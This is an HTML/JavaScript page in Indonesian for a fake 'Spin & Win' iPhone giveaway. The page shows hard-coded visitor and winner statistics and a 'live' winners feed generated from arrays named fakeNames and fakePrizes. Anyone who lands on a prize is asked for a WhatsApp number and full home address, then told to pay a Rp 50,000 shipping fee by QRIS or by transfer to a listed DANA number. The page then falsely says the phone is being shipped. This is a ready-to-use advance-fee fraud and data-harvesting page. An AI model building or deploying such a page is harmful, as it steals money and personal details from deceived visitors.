<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Grand Giveaway - Spin & Win</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            /* Tema warna Pink Gradient */
            background: linear-gradient(145deg, #ffe4e1 0%, #ffb6c1 50%, #ff69b4 100%);
            padding: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        .container {
            max-width: 520px;
            width: 100%;
            margin: 0 auto;
        }

        .card {
            background: #ffffff;
            border-radius: 44px;
            padding: 28px 22px 36px;
            box-shadow: 0 30px 55px rgba(200, 50, 100, 0.25);
        }

        .header-banner {
            width: 100%;
            height: 90px;
            object-fit: cover;
            border-radius: 20px;
            margin-bottom: 16px;
            background: #f0f0f0; /* Warna fallback jika gambar gagal load */
            border: 1px solid #ffe4e1;
        }

        h1 {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(125deg, #d81b60, #ad1457);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 6px;
        }

        .sub {
            color: #880e4f;
            font-size: 14px;
            margin-bottom: 28px;
        }

        .wheel-area {
            position: relative;
            width: 310px;
            height: 310px;
            margin: 0 auto 30px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            box-shadow: 0 16px 35px rgba(255, 105, 180, 0.3);
        }

        .needle-container {
            position: absolute;
            top: -24px;
            left: 50%;
            transform: translateX(-50%);
            width: 40px;
            height: 70px;
            z-index: 20;
            transform-origin: 50% 15px;
            transition: transform 0.05s linear;
        }

        .needle {
            position: absolute;
            top: 15px;
            left: 0;
            width: 0;
            height: 0;
            border-left: 20px solid transparent;
            border-right: 20px solid transparent;
            border-top: 52px solid #d81b60;
            filter: drop-shadow(0 6px 8px rgba(0,0,0,0.2));
        }

        .needle-dot {
            position: absolute;
            top: 5px;
            left: 10px;
            width: 20px;
            height: 20px;
            background: #d81b60;
            border-radius: 50%;
            border: 2px solid white;
            z-index: 21;
        }

        .spin-btn {
            position: absolute;
            width: 84px;
            height: 84px;
            background: linear-gradient(135deg, #d81b60, #ad1457);
            border: 4px solid #ffffff;
            border-radius: 50%;
            color: white;
            font-weight: 800;
            font-size: 16px;
            letter-spacing: 1px;
            cursor: pointer;
            z-index: 15;
            box-shadow: 0 10px 22px rgba(216, 27, 96, 0.4);
            transition: 0.1s ease;
        }

        .spin-btn:active {
            transform: scale(0.92);
        }

        .spin-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: scale(1);
        }

        .live-panel {
            background: #fff0f5;
            border-radius: 32px;
            padding: 18px;
            margin: 26px 0 20px;
            border: 1px solid #ffe4e1;
        }

        .live-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 14px;
            padding-bottom: 10px;
            border-bottom: 1px solid #ffb6c1;
        }

        .live-dot {
            width: 10px;
            height: 10px;
            background: #d81b60;
            border-radius: 50%;
            animation: pulseLive 1.3s infinite;
        }

        @keyframes pulseLive {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.15); }
        }

        .live-badge {
            background: rgba(216, 27, 96, 0.1);
            padding: 5px 14px;
            border-radius: 40px;
            font-size: 11px;
            font-weight: 700;
            color: #ad1457;
        }

        .live-counter {
            margin-left: auto;
            font-size: 11px;
            background: #ffffff;
            padding: 5px 12px;
            border-radius: 40px;
            color: #880e4f;
        }

        .live-list {
            height: 96px;
            overflow: hidden;
            position: relative;
        }

        .live-row {
            padding: 8px 0;
            font-size: 13px;
            color: #4a0024;
            border-bottom: 1px solid #ffe4e1;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .winner-avatar {
            width: 28px;
            height: 28px;
            background: #ffb6c1;
            border-radius: 50%;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            color: #ad1457;
            font-size: 12px;
        }

        .winner-name {
            font-weight: 700;
            color: #ad1457;
        }

        .stats-row {
            display: flex;
            gap: 14px;
            margin: 20px 0 18px;
        }

        .stat-block {
            flex: 1;
            background: #fff0f5;
            padding: 12px 8px;
            border-radius: 26px;
            text-align: center;
        }

        .stat-number {
            font-size: 22px;
            font-weight: 800;
            color: #ad1457;
        }

        .stat-label {
            font-size: 10px;
            color: #880e4f;
            margin-top: 5px;
        }

        .footer-note {
            text-align: center;
            font-size: 10px;
            color: #ad1457;
            margin-top: 18px;
        }

        .result-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(8px);
            z-index: 1000;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .result-card {
            background: white;
            border-radius: 48px;
            max-width: 480px;
            width: 100%;
            padding: 32px 26px;
            text-align: center;
            animation: fadeScale 0.25s ease;
            max-height: 90vh;
            overflow-y: auto;
        }

        @keyframes fadeScale {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .status-title {
            font-size: 28px;
            color: #d81b60;
            font-weight: 800;
            margin-bottom: 8px;
            letter-spacing: 1px;
        }

        .prize-img {
            width: 120px;
            height: 120px;
            object-fit: contain;
            background: #fff0f5;
            border-radius: 30px;
            padding: 12px;
            margin: 12px auto;
        }

        .prize-title {
            font-size: 20px;
            font-weight: 800;
            color: #4a0024;
            margin: 8px 0;
        }

        .form-input, .form-textarea {
            width: 100%;
            padding: 14px 18px;
            margin: 8px 0;
            border: 1.5px solid #ffb6c1;
            border-radius: 28px;
            font-size: 14px;
            background: #fefefe;
            font-family: inherit;
        }
        
        .form-textarea { resize: vertical; }

        /* Style Pembayaran */
        .payment-label {
            margin: 16px 0 8px;
            font-weight: 700;
            color: #ad1457;
            font-size: 15px;
            text-align: left;
            padding-left: 10px;
        }

        .payment-options {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }

        .pay-btn {
            flex: 1;
            padding: 12px;
            background: #fff;
            border: 2px solid #ffb6c1;
            border-radius: 20px;
            font-weight: bold;
            color: #ad1457;
            cursor: pointer;
            transition: all 0.2s;
        }

        .pay-btn.active {
            background: #d81b60;
            color: white;
            border-color: #d81b60;
        }

        .payment-details {
            display: none; /* Disembunyikan sampai user memilih metode */
            background: #fff0f5;
            border-radius: 24px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .payment-img {
            width: 160px;
            height: 160px;
            object-fit: contain;
            background: white;
            border-radius: 16px;
            padding: 8px;
            border: 1px solid #ffb6c1;
            margin: 0 auto 12px;
            display: block;
        }

        .shipping-note {
            font-size: 12px;
            color: #880e4f;
            margin-bottom: 10px;
            font-weight: 600;
        }

        .submit-btn {
            background: linear-gradient(105deg, #d81b60, #ad1457);
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 60px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            display: none; /* Muncul otomatis setelah pilih payment */
        }
    </style>
</head>
<body>

<div class="container" id="appContainer">
    <div class="card">
        <div style="text-align: center;">
            <img class="header-banner" src="foto/banner.png" alt="Banner Giveaway" onerror="this.style.display='none'">
            <h1>SPIN & WIN</h1>
            <div class="sub">Putar roda, dapatkan gadget impian!</div>
        </div>

        <div class="wheel-area">
            <canvas id="wheelCanvas" width="500" height="500"></canvas>
            <div class="needle-container" id="needleWrapper">
                <div class="needle-dot"></div>
                <div class="needle"></div>
            </div>
            <button class="spin-btn" id="spinBtn">SPIN</button>
        </div>

        <div class="live-panel">
            <div class="live-header">
                <div class="live-dot"></div>
                <span class="live-badge">LIVE ACTIVITY</span>
                <span class="live-counter">2,104 online</span>
            </div>
            <div class="live-list" id="liveList">
                <div class="live-row"><span class="winner-avatar">A</span><span class="winner-name">Aldi</span><span style="color:#5a5a7a;">mendapat iPhone 12</span></div>
                <div class="live-row"><span class="winner-avatar">R</span><span class="winner-name">Rika</span><span style="color:#5a5a7a;">mendapat iPhone 15</span></div>
                <div class="live-row"><span class="winner-avatar">B</span><span class="winner-name">Budi</span><span style="color:#5a5a7a;">mendapat iPhone 11</span></div>
            </div>
        </div>

        <div class="stats-row">
            <div class="stat-block"><div class="stat-number">4.2k+</div><div class="stat-label">Pemenang</div></div>
            <div class="stat-block"><div class="stat-number">99%</div><div class="stat-label">Kepuasan</div></div>
            <div class="stat-block"><div class="stat-number">Real</div><div class="stat-label">Pengiriman</div></div>
        </div>
        <div class="footer-note">*Setiap perangkat berhak 1x putaran setiap 1 menit.</div>
    </div>
</div>

<script>
    // List Hadiah (Update sesuai instruksi)
    const SEGMENTS = [
        { name: "iPhone 17", img: "1.png", color: "#ff80ab" },
        { name: "iPhone 15", img: "2.png", color: "#ff4081" },
        { name: "iPhone 12", img: "3.png", color: "#f50057" },
        { name: "iPhone XR", img: "4.png", color: "#c51162" },
        { name: "iPhone 11", img: "5.png", color: "#ec407a" },
        { name: "Zonk", img: "6.png", color: "#b0bec5" } // Warna netral untuk zonk
    ];

    const SEGMENT_COUNT = SEGMENTS.length;
    const ANGLE_PER_SEG = (Math.PI * 2) / SEGMENT_COUNT;

    let canvas = document.getElementById('wheelCanvas');
    let ctx = canvas.getContext('2d');
    let spinBtn = document.getElementById('spinBtn');
    let needleWrapper = document.getElementById('needleWrapper');
    
    let currentAngle = 0;
    let spinning = false;
    let animFrame = null;

    function drawWheel() {
        const size = canvas.width;
        const center = size / 2;
        const radius = size / 2 - 6;

        ctx.clearRect(0, 0, size, size);

        for (let i = 0; i < SEGMENT_COUNT; i++) {
            const start = currentAngle + i * ANGLE_PER_SEG;
            const end = start + ANGLE_PER_SEG;

            ctx.beginPath();
            ctx.moveTo(center, center);
            ctx.arc(center, center, radius, start, end);
            ctx.fillStyle = SEGMENTS[i].color;
            ctx.fill();
            ctx.strokeStyle = "#fff";
            ctx.lineWidth = 3;
            ctx.stroke();

            ctx.save();
            ctx.translate(center, center);
            ctx.rotate(start + ANGLE_PER_SEG / 2);
            ctx.textAlign = "center";
            ctx.textBaseline = "middle";
            ctx.font = "bold 18px 'Segoe UI'"; 
            ctx.fillStyle = "#ffffff"; // Tulisan putih biar kontras dengan pink
            let txt = SEGMENTS[i].name;
            ctx.fillText(txt, radius * 0.65, 0);
            ctx.restore();
        }
    }

    function getWinnerIndex() {
        let topAngle = 1.5 * Math.PI; 
        let distance = (topAngle - currentAngle) % (Math.PI * 2);
        if (distance < 0) distance += Math.PI * 2;
        
        let idx = Math.floor(distance / ANGLE_PER_SEG);
        if(idx >= SEGMENT_COUNT) idx = 0;
        return idx;
    }

    function spinWheel() {
        if(spinning) return;

        // Sistem Cooldown 1 Menit
        const now = Date.now();
        const lastSpin = localStorage.getItem('last_spin_time');
        if (lastSpin && now - parseInt(lastSpin) < 60000) {
            const secondsLeft = Math.ceil((60000 - (now - parseInt(lastSpin))) / 1000);
            alert(`Sabar ya! Kamu baru saja memutar roda. Silakan coba lagi dalam ${secondsLeft} detik.`);
            return;
        }

        spinning = true;
        spinBtn.disabled = true;

        const extraSpins = 10 + Math.random() * 15;
        const randomDelta = Math.random() * Math.PI * 2;
        const startVal = currentAngle;
        const endVal = currentAngle + (extraSpins * Math.PI * 2) + randomDelta;
        const startTime = performance.now();

        function animate(nowTime) {
            const elapsed = nowTime - startTime;
            const duration = 3000;
            
            if(elapsed >= duration) {
                currentAngle = endVal % (Math.PI * 2);
                spinning = false;
                spinBtn.disabled = false;
                needleWrapper.style.transform = `translateX(-50%) rotate(0deg)`;
                drawWheel();
                
                // Set waktu putaran untuk sistem cooldown
                localStorage.setItem('last_spin_time', Date.now());

                const winIdx = getWinnerIndex();
                showResult(SEGMENTS[winIdx]);
                return;
            }
            
            const t = elapsed / duration;
            const ease = 1 - Math.pow(1 - t, 4);
            currentAngle = startVal + (endVal - startVal) * ease;
            
            let offset = (1.5 * Math.PI - currentAngle) % ANGLE_PER_SEG;
            if (offset < 0) offset += ANGLE_PER_SEG;
            let progress = offset / ANGLE_PER_SEG;
            let needleAngle = Math.sin(progress * Math.PI * 2) * 10;
            needleWrapper.style.transform = `translateX(-50%) rotate(${needleAngle}deg)`;

            drawWheel();
            animFrame = requestAnimationFrame(animate);
        }
        animFrame = requestAnimationFrame(animate);
    }

    function showResult(prize) {
        const overlay = document.createElement('div');
        overlay.className = 'result-overlay';

        // Logika Khusus Jika Dapat ZONK
        if (prize.name.toLowerCase() === "zonk") {
            overlay.innerHTML = `
                <div class="result-card">
                    <img class="prize-img" src="foto/${prize.img}" alt="Zonk" onerror="this.src='foto/default.png'">
                    <div class="status-title" style="color:#4a0024; font-size:24px; margin-top:15px;">yah kamu zonk, coba lagi</div>
                    <button class="submit-btn" style="display:block; margin-top:20px;" onclick="document.querySelector('.result-overlay').remove()">TUTUP</button>
                </div>
            `;
            document.body.appendChild(overlay);
            return; // Hentikan eksekusi, jangan munculkan form konfirmasi
        }

        // Jika Dapat Hadiah Asli (Form Konfirmasi dengan Sistem Pembayaran)
        overlay.innerHTML = `
            <div class="result-card" id="claimCard">
                <div class="status-title">SELAMAT!</div>
                <div style="font-size:16px; color:#880e4f; font-weight:600;">KAMU BERHASIL MENDAPATKAN</div>
                <img class="prize-img" src="foto/${prize.img}" alt="${prize.name}" onerror="this.src='foto/default.png'">
                <div class="prize-title" style="font-size:24px;">${prize.name}</div>
                
                <input class="form-input" type="tel" id="phoneNumber" placeholder="Nomor WhatsApp Aktif" autocomplete="off">
                <textarea class="form-textarea" id="fullAddress" rows="2" placeholder="Alamat lengkap (RT/RW, Desa, Kec, Kota, Kode Pos)"></textarea>
                
                <div class="payment-label">Pilih Metode Pembayaran Ongkir (Rp 50.000):</div>
                <div class="payment-options">
                    <button class="pay-btn" id="btnQris">QRIS</button>
                    <button class="pay-btn" id="btnTf">Transfer Nomor</button>
                </div>

                <div class="payment-details" id="paymentData">
                    <img class="payment-img" id="imgPayment" src="" alt="Payment Info">
                    <div class="shipping-note" id="textPayment">Silakan lakukan pembayaran ongkos kirim.</div>
                </div>

                <button class="submit-btn" id="submitClaim">KIRIM PESANAN</button>
            </div>
        `;
        document.body.appendChild(overlay);

        // Logic Pilihan Pembayaran Dinamis
        const btnQris = document.getElementById('btnQris');
        const btnTf = document.getElementById('btnTf');
        const paymentData = document.getElementById('paymentData');
        const imgPayment = document.getElementById('imgPayment');
        const textPayment = document.getElementById('textPayment');
        const submitClaim = document.getElementById('submitClaim');

        btnQris.addEventListener('click', () => {
            btnQris.classList.add('active');
            btnTf.classList.remove('active');
            paymentData.style.display = 'block';
            submitClaim.style.display = 'block'; // Tampilkan tombol submit
            imgPayment.src = 'foto/qris.png';    // Pastikan foto qris.png ada di folder foto
            textPayment.innerText = 'Scan QRIS di atas untuk membayar ongkos kirim. Barang akan diproses setelah pembayaran masuk.';
        });

        btnTf.addEventListener('click', () => {
            btnTf.classList.add('active');
            btnQris.classList.remove('active');
            paymentData.style.display = 'block';
            submitClaim.style.display = 'block'; // Tampilkan tombol submit
            imgPayment.src = 'foto/dana.png';    // Pastikan foto dana.png ada di folder foto
            textPayment.innerText = 'Transfer ke No. DANA: 089530221506 (A/N: Admin). Harap simpan bukti transfer.';
        });

        // Logic Eksekusi Pengiriman Form
        submitClaim.addEventListener('click', () => {
            const phone = document.getElementById('phoneNumber').value.trim();
            const address = document.getElementById('fullAddress').value.trim();
            
            if(!phone || !address) {
                alert("Harap lengkapi Nomor WA dan Alamat Lengkap terlebih dahulu.");
                return;
            }
            
            const clientData = {
                prize: prize.name,
                phone: phone,
                address: address,
                time: new Date().toISOString()
            };
            
            let saved = JSON.parse(localStorage.getItem('winners_data') || '[]');
            saved.push(clientData);
            localStorage.setItem('winners_data', JSON.stringify(saved));
            
            // Layout sukses
            document.getElementById('claimCard').innerHTML = `
                <div class="status-title">BERHASIL</div>
                <div class="prize-title">PESANAN DIPROSES</div>
                <p style="margin:12px 0; color:#4a0024; font-weight:600;">${prize.name} sedang disiapkan untuk pengiriman.</p>
                <p style="background:#fff0f5; border-radius:20px; padding:12px; border:1px solid #ffb6c1;">Estimasi Pengiriman: 5 - 7 Hari Kerja</p>
                <p style="margin-top:20px; font-size:13px; color:#ad1457;">Resi akan segera dikirimkan ke WhatsApp Anda.</p>
                <button class="submit-btn" style="display:block; margin-top:20px;" onclick="document.querySelector('.result-overlay').remove()">TUTUP</button>
            `;
        });
    }

    spinBtn.addEventListener('click', spinWheel);
    drawWheel();

    // Data Pemenang Buatan
    const fakeNames = ["Riski", "Sari", "Joko", "Mawar", "Budi", "Dewi", "Andre", "Cindy", "Bima", "Lina", "Fajar"];
    const fakePrizes = ["iPhone 17", "iPhone 15", "iPhone 12", "iPhone XR", "iPhone 11"];
    
    setInterval(() => {
        const list = document.getElementById('liveList');
        const newRow = document.createElement('div');
        newRow.className = 'live-row';
        const randName = fakeNames[Math.floor(Math.random() * fakeNames.length)];
        const randPrize = fakePrizes[Math.floor(Math.random() * fakePrizes.length)];
        const initial = randName.charAt(0);
        newRow.innerHTML = `<span class="winner-avatar">${initial}</span><span class="winner-name">${randName}</span><span style="color:#5a5a7a;">mendapat ${randPrize}</span>`;
        list.insertBefore(newRow, list.firstChild);
        if(list.children.length > 8) {
            list.removeChild(list.lastChild);
        }
    }, 3200);
</script>
</body>
</html>
